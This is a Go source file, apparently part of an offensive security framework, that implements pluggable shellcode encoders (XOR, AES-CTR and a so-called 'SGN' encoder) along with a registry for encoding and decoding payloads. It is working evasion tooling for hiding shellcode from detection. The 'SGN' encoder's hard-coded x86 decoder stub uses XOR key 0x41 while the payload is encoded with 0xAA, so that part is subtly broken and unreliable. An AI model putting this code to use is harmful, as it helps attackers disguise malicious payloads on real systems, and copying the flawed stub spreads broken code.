package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"sync"
)

type EncoderPlugin interface {
	Encode(data []byte, key []byte) ([]byte, error)
	Decode(data []byte, key []byte) ([]byte, error)
}

type XOREncoder struct{}

func (XOREncoder) Encode(data []byte, key []byte) ([]byte, error) {
	if len(key) == 0 {
		key = []byte{0x41}
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out, nil
}

func (XOREncoder) Decode(data []byte, key []byte) ([]byte, error) {
	return XOREncoder{}.Encode(data, key)
}

type AESEncoder struct{}

func (AESEncoder) Encode(data []byte, key []byte) ([]byte, error) {
	if len(key) < 16 {
		k := make([]byte, 16)
		copy(k, key)
		key = k
	}
	key = key[:16]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)
	return ciphertext, nil
}

func (AESEncoder) Decode(data []byte, key []byte) ([]byte, error) {
	if len(key) < 16 {
		k := make([]byte, 16)
		copy(k, key)
		key = k
	}
	key = key[:16]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(data) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	iv := data[:aes.BlockSize]
	ciphertext := data[aes.BlockSize:]
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(plaintext, ciphertext)
	return plaintext, nil
}

type SGNEncoder struct{}

func (SGNEncoder) Encode(data []byte, key []byte) ([]byte, error) {
	_ = key
	stub := []byte{
		0xEB, 0x10, 0x5A, 0x4A, 0x33, 0xC9, 0x66, 0xB9,
		0x00, 0x00, 0x80, 0x34, 0x0A, 0x41, 0xE2, 0xFA,
		0xEB, 0x05, 0xE8, 0xEB, 0xFF, 0xFF, 0xFF,
	}
	encoded, _ := XOREncoder{}.Encode(data, []byte{0xAA})
	payloadLen := len(encoded)
	binary.LittleEndian.PutUint16(stub[8:10], uint16(payloadLen))
	result := make([]byte, 0, len(stub)+len(encoded)+8)
	result = append(result, stub...)
	result = append(result, encoded...)
	return result, nil
}

func (SGNEncoder) Decode(data []byte, key []byte) ([]byte, error) {
	if len(data) < 24 {
		return nil, fmt.Errorf("data too short for sgn decoder")
	}
	encoded := data[23:]
	if len(encoded) < 2 {
		return nil, fmt.Errorf("no encoded payload")
	}
	payloadLen := int(binary.LittleEndian.Uint16(data[8:10]))
	if payloadLen > len(encoded) {
		payloadLen = len(encoded)
	}
	decoded, _ := XOREncoder{}.Decode(encoded[:payloadLen], []byte{0xAA})
	return decoded, nil
}

var (
	registeredEncoders   = map[ShellcodeEncode]EncoderPlugin{
		EncodeXOR: XOREncoder{},
		EncodeAES: AESEncoder{},
		EncodeSGN: SGNEncoder{},
	}
	registeredEncodersMu sync.RWMutex
)

func EncodeShellcode(data []byte, method ShellcodeEncode, key []byte) ([]byte, error) {
	if method == EncodeNone || method == "" {
		return data, nil
	}
	registeredEncodersMu.RLock()
	enc, ok := registeredEncoders[method]
	registeredEncodersMu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("unknown encoder: %s", method)
	}
	return enc.Encode(data, key)
}

func DecodeShellcode(data []byte, method ShellcodeEncode, key []byte) ([]byte, error) {
	if method == EncodeNone || method == "" {
		return data, nil
	}
	registeredEncodersMu.RLock()
	enc, ok := registeredEncoders[method]
	registeredEncodersMu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("unknown encoder: %s", method)
	}
	return enc.Decode(data, key)
}

func RegisterEncoder(name ShellcodeEncode, plugin EncoderPlugin) {
	registeredEncodersMu.Lock()
	registeredEncoders[name] = plugin
	registeredEncodersMu.Unlock()
}
